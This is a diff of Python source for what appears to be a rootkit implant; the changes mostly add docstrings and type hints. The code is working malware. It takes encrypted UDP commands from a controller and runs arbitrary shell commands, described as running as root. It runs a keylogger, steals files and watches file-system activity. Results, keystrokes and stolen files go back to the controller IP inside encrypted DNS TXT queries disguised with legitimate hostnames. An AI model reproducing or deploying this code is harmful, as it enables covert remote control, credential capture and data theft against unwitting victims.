@@ -91,21 +91,34 @@ STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
 BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")
 
 
-# Defining the default event handling code for files.
 def on_created(event):
+    """
+        Default event handler for creation events for files.
+    """
     forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}\n", MONITOR_IDENTIFICATION)
 
 def on_deleted(event):
+    """
+        Default event handler for deletion events for files.
+    """
     forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}\n", MONITOR_IDENTIFICATION)
 
 def on_modified(event):
+    """
+        Default event handler for modification events for files.
+    """
     forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}\n", MONITOR_IDENTIFICATION)
 
 def on_moved(event):
+    """
+        Default event handler for move events for files.
+    """
     forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}\n", MONITOR_IDENTIFICATION)
 
-# This is used for directories.
 def on_any_event_directories(event):
+    """
+        Default event handler for all directory events.
+    """
     if event.is_directory:
         if event.event_type == "created":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Created: {event.src_path}\n", MONITOR_IDENTIFICATION)
@@ -127,20 +140,47 @@ def on_any_event_directories(event):
 
 
 class FileSystemMonitor():
+    """
+        The FileSystemMonitor class contains methods for watching files and directories
+        for events. It is a wrapper for the watchdog module in Python (https://pypi.org/project/watchdog/).
+    """
 
     __FILE = 1
     __DIRECTORY = 2
     __INVALID = 3
 
 
-    def __init__(self, path=None):
-        self.__path = None
+    def __init__(self):
+        """
+            Constructor method.
+
+            Returns an instance of the FileSystemMonitor class.
+
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            An instance of the FileSystemMonitor class.
+        """
         self.__threads = [] # List of threads watching directories.
 
 
     def shutdown(self):
         """
-            Goes through all threads and shuts down each one.
+            Shutdown all threads.
+
+            Iterates through the list of internal file/directory monitoring threads
+            and stops each thread and waits for it to exit.
+            
+            Parameters
+            ----------
+            None
+
+            Returns
+            -------
+            None
         """
         for thread in self.__threads:
             thread.stop()
@@ -148,11 +188,21 @@ class FileSystemMonitor():
             thread.join()
 
 
-    def __validate_path(self, path) -> int:
+    def __validate_path(self, path: str) -> int:
         """
+            Validate a file path.
+
             Checks if the given path is valid and returns a code
             which tells the programmer if the path points to a file, 
             directory, or is invalid.
+
+            Parameters
+            ----------
+            path: str - The file path to validate.
+
+            Returns
+            -------
+            int - An integer with a value equal to one of self.__FILE, self.__DIRECTORY, or self.__INVALID
         """
         if os.path.isdir(path):
             return self.__DIRECTORY
@@ -161,24 +211,45 @@ class FileSystemMonitor():
         return self.__INVALID
 
 
-    def __get_parent_directory(self, path) -> str:
+    def __get_parent_directory(self, path: str) -> str:
         """
-            Takes a path to a file as input, and returns the parent directory.
+            Get the parent directory of the path.
+
+            Takes a path to a file as input, and returns the parent directory of that file.
+
+            Parameters
+            ----------
+            path: str - A path to a file.
+
+            Returns
+            -------
+            str - A path to the parent directory of the given file path.
         """
         p = Path(path)
         return p.parent.absolute()
 
 
-    def monitor(self, path: str):
+    def monitor(self, path: str) -> None:
         """
-            Check if path is invalid, directory, or file.
+            Monitors the given path for changes.
+
+            Monitors the given path, which could be a directory or a file path, 
+            and starts a thread that watches for changes. When changes get detected, 
+            an event handler is called that sends a notification to the controller.
+
+            Parameters
+            ----------
+            path: str - A path to a directory or file. 
+
+            Returns
+            -------
+            None
         """
         code: int = self.__validate_path(path)
         if code == self.__INVALID:
             print(f"Path does not exist: {path}")
             exit(1)
         if code == self.__FILE:
-            print(f"File: {path}")
             # Defining event handler which will only emit file specific events.
             event_handler = PatternMatchingEventHandler(patterns = [os.path.basename(path)],
                                                         ignore_directories=True,
@@ -195,7 +266,6 @@ class FileSystemMonitor():
             self.__threads.append(observer)
             return
         elif code == self.__DIRECTORY:
-            print(f"Directory: {path}")
             event_handler = FileSystemEventHandler()
             event_handler.on_any_event = on_any_event_directories
             observer = Observer()
@@ -205,13 +275,42 @@ class FileSystemMonitor():
             return
 
 
-def get_random_hostname():
+def get_random_hostname() -> str:
+    """
+        Get a random hostname.
+
+        Uses the random library to randomly choose a hostname 
+        out of a list of legitimate hostnames.
+
+        Parameters
+        ----------
+        None
+
+        Returns
+        -------
+        str - The randomly chosen hostname.
+    """
     size = len(HOSTNAMES)
     index = randint(0, size-1)
     return HOSTNAMES[index]
 
 
-def receive_udp_command(pkt):
+def receive_udp_command(pkt) -> str:
+    """
+        Receives a command from the controller.
+
+        Receives a command from a UDP datagram sent by the controller 
+        and decrypts the packaged information and returns it as 
+        a string.
+
+        Parmeters
+        ---------
+        pkt - The packet to operate on.
+
+        Returns
+        -------
+        str - The received command.
+    """
     msg_len = pkt[UDP].len
     ciphertext = bytes(pkt[UDP].payload)[0:msg_len]
     msg_bytes = STREAM_ENCRYPTION_HANDLER.decrypt(ciphertext)
@@ -219,16 +318,22 @@ def receive_udp_command(pkt):
     return msg
 
 
-def send_dns_query(query):
-    """
-        Send dns query. This is kind of a useless function.
-    """
-    send(query, verbose=0)
-
-
 def forge_dns_query_stream(data: str, indentification: int):
     """
-        Forge dns query using the stream cipher.
+        Forge DNS query using stream encryption.
+        
+        Forges a DNS query by encrypting the given data using a 
+        stream cipher, and then placing the encrypted data into a 
+        TXT record inside of the DNS query.
+
+        Parameters
+        ----------
+        data: str - The data to place into the DNS query.
+        identification: int - The identification number for the type of data.
+
+        Returns
+        -------
+        A forged DNS query packet.
     """
     hostname = get_random_hostname()
     encrypted_data = b""
@@ -239,14 +344,27 @@ def forge_dns_query_stream(data: str, indentification: int):
         encrypted_data = STREAM_ENCRYPTION_HANDLER.encrypt(truncated_data.encode("utf-8"))
     else:
         encrypted_data = STREAM_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
-    # Forge the DNS packet with data in the text record.
     query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
     return query
 
 
 def forge_dns_query_block(data: str, indentification: int):
     """
-        Forge dns query using a block cipher.
+        Sends data to the contoller through forged DNS queries.
+
+        Sends data to the controller through the use of forged DNS queries. 
+        The data gets encrypted with a block cipher. If there is too much data 
+        to send in one DNS query packet, then it keeps forging and sending packets 
+        until there is no more data to be sent.
+
+        Parameters
+        ----------
+        data: str - The data to send to the controller.
+        identification: int - The identification number for the type of data being sent.
+
+        Returns
+        -------
+        None
     """
     hostname = get_random_hostname()
     encrypted_data = b""
@@ -268,53 +386,129 @@ def forge_dns_query_block(data: str, indentification: int):
 
 
 def execute_watch_command(path: str) -> bool:
+    """
+        Execute the watch command with the given path.
+
+        Verifies the given path exists and then uses the FileSystemMonitor 
+        class to watch the path for changes. It also sends a notification to the 
+        controller if the file doesn't exist or if the file is successfully being 
+        monitored.
+
+
+        Parameters
+        ----------
+        path: str - The path, file or directory, to watch.
+
+        Returns
+        -------
+        bool - True on success, False on failure.
+    """
     if not os.path.exists(path):
         query = forge_dns_query_stream(f"ERRORMSG: Path: {path} does not exist.", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
         return False
     MONITOR.monitor(path)
     query = forge_dns_query_stream(f"Path '{path}' will be monitored.", GENERAL_MSG_IDENTIFICATION)
-    send_dns_query(query)
+    send(query, verbose=0)
     return True
 
 
-def stop_keylogger():
+def stop_keylogger() -> None:
+    """
+        Stops the keylogger.
+
+        Attempts to stop the keylogger instance running on this host and 
+        then sends a notification to the controller informing it of success 
+        or failure.
+
+        Parameters
+        ----------
+        None
+
+        Returns
+        -------
+        None
+    """
     if KEYLOGGER_INSTANCE.stop():
         print("SUCCESS: Stopped keylogger")
         query = forge_dns_query_stream("SUCCESS: Stopped keylogger", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
     else:
         print("FAILED: You can't stop an inactive keylogger")
         query = forge_dns_query_stream("FAILED: You can't stop an inactive keylogger", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
 
 
-def start_keylogger():
+def start_keylogger() -> None:
+    """
+        Starts the keylogger.
+
+        Attempts to start the keylogger instance running on this host and 
+        then sends a notification to the controller informing it of success 
+        or failure.
+
+        Parameters
+        ----------
+        None
+
+        Returns
+        -------
+        None
+    """
     if KEYLOGGER_INSTANCE.start():
         print("SUCCESS: Started keylogger")
         query = forge_dns_query_stream("SUCCESS: Started keylogger", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
     else:
         print("FAILED: You can't start an active keylogger")
         query = forge_dns_query_stream("FAILED: You can't start an active keylogger", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
 
 
-def transfer_keylogger():
+def transfer_keylogger() -> None:
+    """
+        Transfer the keylogger.
+
+        Reads the data collected by the keylogger, if the data is empty, then 
+        send a failure notification to the contoller. Otherwise, send the data 
+        covertly to the controller using forged DNS queries. After sending, clear 
+        the keylog data.
+
+        Parameters
+        ----------
+        None
+
+        Returns
+        -------
+        None
+    """
     data = KEYLOGGER_INSTANCE.get_keylog()
     KEYLOGGER_INSTANCE.clear_keylog()
     if not data:
         print("FAILED: Keylogger has not captured any data.")
         query = forge_dns_query_stream("FAILED: Keylogger has not captured any data.", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
     else:
         print("SUCCESS: Transferring keylog data...")
         query = forge_dns_query_stream("SUCCESS: Transferring keylog data...", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
         forge_dns_query_block(data, KEYLOG_IDENTIFICATION)
 
 
-def arg_list_to_string(args: list):
+def arg_list_to_string(args: list) -> str:
+    """
+        Convert a list of strings into a string 
+        where each list item is delimited by a space 
+        character.
+
+        Parameters
+        ----------
+        args: list - A list of strings.
+
+        Returns
+        -------
+        str - The list as a string.
+    """
     result = ""
     for arg in args:
         result += arg
@@ -325,24 +519,50 @@ def arg_list_to_string(args: list):
 
 def execute_arbitrary_command(args: list) -> str:
     """
-        Take list of arguments as input, execute the command,
-        and return the result as a string.
+        Execute the given command on the rootkit host.
+
+        Takes a list of arguments as input, executes the command as root,
+        and returns the result as a string.
+
+        Parameters
+        ----------
+        args: list - A list of strings representing the arguments of a command.
+
+        Returns
+        -------
+        str - The output of the command.
+        
     """
     command = arg_list_to_string(args)
     result = subprocess.getoutput(command)
     return result
 
 
-def execute_steal_file(filepath) -> bool:
+def execute_steal_file(filepath: str) -> bool:
+    """
+        Transfers a file from the rootkit to the controller host.
+
+        Takes a file path as input, verifies that it exists and that it 
+        isn't a directory, reads the bytes from the file, and sends 
+        the bytes to the controller through the use of DNS queries.
+
+        Parameters
+        ----------
+        filepath: str - The path to the file to transfer.
+
+        Returns
+        -------
+        bool - True on success, False on failure.
+    """
     # If the file does not exist, or it isn't a file, we do nothing,
     # and send a notification to the controller
     if not os.path.exists(filepath):
         query = forge_dns_query_stream(f"ERROR: {filepath} not found", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
         return False
     if os.path.isdir(filepath):
         query = forge_dns_query_stream(f"ERROR: {filepath} is a directory.", GENERAL_MSG_IDENTIFICATION)
-        send_dns_query(query)
+        send(query, verbose=0)
         return False
     # Our file exists, and isn't a directory, so do the transfer
     file_data = ""
@@ -359,13 +579,26 @@ def execute_steal_file(filepath) -> bool:
     forge_dns_query_block(file_data.decode("utf-8"), FILE_TRANSFER_IDENTIFICATION)
     # Notify the controller
     query = forge_dns_query_stream("SUCCESS: Sending file...", GENERAL_MSG_IDENTIFICATION)
-    send_dns_query(query)
+    send(query, verbose=0)
     return True
 
 
 def packet_handler(pkt):
     """
+        Main packet handling function.
+        
+        When a packet is received, it checks that it is from 
+        the controller host, and then parses the command from 
+        the encrypted packet, then executes the command and 
+        sends the results back to the controller.
     
+        Parameters
+        ----------
+        pkt - The received packet.
+
+        Returns
+        -------
+        None
     """
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
         return
@@ -378,7 +611,7 @@ def packet_handler(pkt):
             if argv[1] == STOP:
                 MONITOR.shutdown()
                 query = forge_dns_query_stream("SUCCESS: Stopped file monitor.", GENERAL_MSG_IDENTIFICATION)
-                send_dns_query(query)
+                send(query, verbose=0)
             else:
                 execute_watch_command(argv[1])
         if argv[0] == KEYLOGGER:
